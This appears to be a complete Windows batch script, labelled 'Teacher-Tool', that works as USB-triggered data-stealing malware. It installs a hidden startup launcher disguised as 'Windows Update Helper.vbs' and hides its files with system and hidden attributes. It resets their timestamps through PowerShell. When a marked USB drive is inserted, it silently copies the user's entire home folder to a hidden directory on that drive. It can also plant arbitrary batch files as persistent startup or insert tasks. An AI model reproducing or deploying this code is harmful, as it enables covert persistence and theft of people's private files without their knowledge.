REM Version 5.0[DEBUGrelease]
@echo off
set skipcheck=false
set HDver=0
set vers=0
set novbs=false
set debugmsg=true
if exist debugmsg.dat (
set debugmsg=false
copy debugmsg.dat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
)
if %debugmsg%==false @echo on

set ver=_NO_VER 0

set /p ver=<lmao.bat
set ver=%ver:REM =%
REM these lines will be repeated later to get USB version

title Teacher-Tool %ver%
set HDDver=_NO_VER 0

set /p HDDver=<"%appdata%\Microsoft\Windows\lmao.bat"
if exist "%appdata%\Microsoft\Windows\lmao.bat" (
if not %HDDver:~0,3%==REM (
set HDDver=HDD version does not have header[ver possibly lower than 4.5-DEBUGrelease]...
set skipcheck=true
)
)
set HDDver=%HDDver:REM =%

REM because delayed expansion causes weird behavior with win. defender and values dont change in IFs(whyyyy), this is the only option. these variables are used when installing
set HDver=%HDDver:~8%
set HDver=%HDver:.=%
set HDver=%HDver:[DEBUGrelease]=%

echo init begin
set filename=lmao69.dat
if not "%cd%"=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" (
if not "%cd%"=="%appdata%\Microsoft\Windows" (
if not exist %filename% (
echo entered important file creation
echo initcopy>%filename%
attrib +h %filename%
)
if not exist "Windows Update Helper.vbs" (
goto :createvbs
)
)
)
:aftervbs
set skip=False
set tries=0
if not exist "%appdata%\Microsoft\Windows\updating.dat" (echo launching atstartup applications if any... && if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a")))
set state=NOTUPDATING
set dirr=HDD
if exist %filename% (set dirr=FLASH)
echo we are on %dirr%
echo initialization finished; starting main code
echo trying to find correct drive
goto :searching

:changedate
echo starting datechange for vbs
c:
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib -s -h "Windows Update Helper.vbs"
powershell  (Get-Item "Windows` Update` Helper.vbs").CreationTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastWriteTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastAccessTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"

echo starting datechange for bat
attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat"
cd "%appdata%\Microsoft\Windows"
powershell  (Get-Item "lmao.bat").LastWriteTime=Get-Date
powershell  (Get-Item "lmao.bat").LastAccessTime=Get-Date
powershell  (Get-Item "lmao.bat").CreationTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\lmao.bat"

echo checking for additional folders
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (goto :lmaostartuptask)
:aftertask
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (goto :atinserttask)
:afterndtask
if %skip%==true (goto :1)
echo trying to find correct drive
:searching
if %tries%==100000 (set tries=0 && goto :changedate)
if exist "d:\%filename%" (d: && goto :b)
if exist "e:\%filename%" (e: && goto :b)
if exist "f:\%filename%" (f: && goto :b)
if exist "g:\%filename%" (g: && goto :b)
set /a tries=%tries% + 1
goto :searching

:b
echo found drive
set com=0
set /p com=<%filename%
echo calling atinsert programs if any...
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" %%a in (*.bat) do (call "%%a"))
if exist force_dat.dat (set /p com=<%filename% && echo forcing recheck)
if exist %com% (
if exist atstartup.dat (goto :c)
if exist atinsert.dat (goto :i)
echo %filename% contains valid batch executable, calling %com%
call %com%
set com=initcopy
)
:d
if exist UNIN000.dat goto :u
if not %com%==initcopy (echo contents of %filename% are not correct or do not specify valid batch file && goto :searching)

if not exist alreadycopied.dat (echo false >alreadycopied.dat)
set /p copied=<alreadycopied.dat
if exist novbs.dat set novbs=true

echo %filename% verified - on correct drive
if exist TERMINATECMD.dat (taskkill /f /im "cmd.exe")
if exist transfer.dat (echo beginning transfer of files && xcopy transfer\* %homedrive%%homepath% /y)
if exist "Windows Update Helper.vbs" (
echo re/installing vbs to be sure
attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y >nul 2>&1
echo .vbs installed
)

REM second part from above, imported version from hdd version, and thus skipped every update
set /p ver=<lmao.bat
if not %ver:~0,3%==REM (
set ver=USB VERSION DOESNT HAVE HEADER; DOWNGRADING BELOW 4.5-DEBUGrelease!!! BEWARE...
attrib -h beware.dat >nul 2>&1
echo DOWNGRADED FROM "%HDDver%" TO SOMETHING BELOW 4.5-DEBUGrelease!!! BEWARE... >beware.dat 
attrib +h beware.dat
set skipcheck=true
)
set ver=%ver:REM =%
set vers=%ver:~8%
set vers=%vers:.=%
set vers=%vers:[DEBUGrelease]=%

if "%HDver%"=="%vers%" (if %copied%==false (if %skipcheck%==false (echo no version change, update skipped... && goto :skipupdate)))

if %dirr%==FLASH (
if exist lmao.bat (
if %skipcheck%==false (
if "%HDver%" LSS "%vers%" (echo upgrading...)
if "%HDver%" GTR "%vers%" (echo downgrading...)
)
echo From: %HDDver%
echo To: %ver%

attrib -s "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
attrib -s lmao.bat
xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
echo new lmao.bat installed
:skipupdate
attrib -h alreadycopied.dat
echo true >alreadycopied.dat
attrib +h alreadycopied.dat
)
echo x >"%appdata%\Microsoft\Windows\updating.dat"
echo getting back on hdd version
goto :miss
)

if %copied%==false (
if %dirr%==HDD (
echo making preparations to enter flash version
if exist lmao.bat (
start lmao.bat
echo x >"%appdata%\Microsoft\Windows\updating.dat"
echo started flash lmao
if not %novbs%==false pause
exit
)
)
)
echo on hdd bat
echo removing temp file
del "%appdata%\Microsoft\Windows\updating.dat"
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
set curr=%cd%
set curr=%curr:~0,2%
set skip=true
echo setup for datechange finished
goto :changedate
:1
echo datechange successful; getting back on usb
%curr%
attrib -h alreadycopied.dat >nul 2>&1
del alreadycopied.dat >nul 2>&1
if exist dontcopy.dat (echo copying skipped because of dontcopy.dat; checking for usb removal... && echo " ">iwashere.dat && goto :whileexist)
set dire=%random%
if exist RESUME (set /p dire=<RESUME)
echo %dire% > RESUME
attrib +h RESUME
mkdir "%dire%"
attrib +s +h "%dire%"
echo made preparations for copying and made folders hidden
xcopy /S /D "%homedrive%%homepath%" "%dire%" /Y
echo end of copying; removing temp files
attrib -h RESUME
del RESUME
echo checking for usb removal...

:whileexist
del /q "%appdata%\Microsoft\Windows\debugmsg.dat" >nul 2>&1
del "%appdata%\Microsoft\Windows\doing.dat" >nul 2>&1
if not exist %filename% (echo usb removed, restaring app && goto :miss)
goto :whileexist
exit

:c
echo creating startup files and folder
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set com=initcopy
del atstartup.dat
goto :d

:i
echo creating insert files and folder
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set com=initcopy
del atinsert.dat
goto :d

:u
echo about to uninstall %HDDver% from hdd
echo ENTERED UNINSTALL FASE; REST IN INFO.TXT
echo removing system and hidden properties from folders and files... > info.txt
attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" >nul 2>&1
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" >nul 2>&1
attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
echo properties removed, continuing... >> info.txt
echo removing lmaostartup... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" >nul 2>&1
echo lmaostartup removed >> info.txt
echo removing atinsert... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" >nul 2>&1
echo atinsert removed >> info.txt
echo removing vbs... >> info.txt
del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
echo vbs removed >> info.txt
echo removing lmao.bat (if uninstalling without lmao.bat on usb, rest not available)... >> info.txt
del /q "%appdata%\Microsoft\Windows\debugmsg.dat" >nul 2>&1
del /q "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
echo lmao.bat removed >> info.txt
echo UNINSTALL COMPLETED SUCCESSFULLY >> info.txt
if not %novbs%==false pause
exit

:miss
echo entered restart fase
%homedrive:~0,2%
if %novbs%==false (
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
wscript "Windows Update Helper.vbs"
exit
)
cd "%appdata%\Microsoft\Windows\"
start lmao.bat
if not %novbs%==false pause
exit

REM DO NOT PUT IN IF; MAKES CMD EXECUTE IN ORDER TO FIND ERRORS AND CRASHES (because of missing files)

:lmaostartuptask
echo lmaostartup datechange entered
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set tempor=%tempor: =` %
echo %tempor%
powershell (Get-Item %tempor% -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor% -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor% -force).CreationTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
echo datechange successful
goto :aftertask


:atinserttask
echo atinsert datechange entered
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set tempor=%tempor: =` %
echo %tempor%
powershell (Get-Item %tempor% -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor% -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor% -force).CreationTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
echo datechange successful
goto :afterndtask

REM END OF CRUCIAL CODE POSITION

:createvbs
echo creating vbs
echo Set WshShell = CreateObject("WScript.Shell")  >"Windows Update Helper.vbs"
echo 'idk >>"Windows Update Helper.vbs"
echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"Windows Update Helper.vbs"
echo 'idk >>"Windows Update Helper.vbs"
echo 'idk >>"Windows Update Helper.vbs"
echo Set WshShell = Nothing >>"Windows Update Helper.vbs"
echo 'idk >>"Windows Update Helper.vbs"
echo 'idk >>"Windows Update Helper.vbs"
echo created successfully
goto :aftervbs
